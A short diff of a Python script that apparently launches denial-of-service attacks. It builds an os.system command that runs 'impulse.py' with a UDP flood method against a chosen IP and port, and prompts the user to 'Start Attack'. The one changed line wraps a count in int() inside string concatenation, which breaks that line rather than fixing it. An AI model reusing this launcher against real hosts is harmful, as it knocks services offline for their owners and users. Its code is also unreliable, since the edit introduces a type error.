@@ -122,7 +122,7 @@ def udp():
   os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+threadcount+" --method UDP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 
-yesno = input(Fore.RED+"  Start Attack on "+ip+" With "+count+"x Multiplier"+"? Y/N: ")
+yesno = input(Fore.RED+"  Start Attack on "+ip+" With "+int(count)+"x Multiplier"+"? Y/N: ")
 
 if yesno == "n":
   print(Fore.BLUE+"  Exiting...")
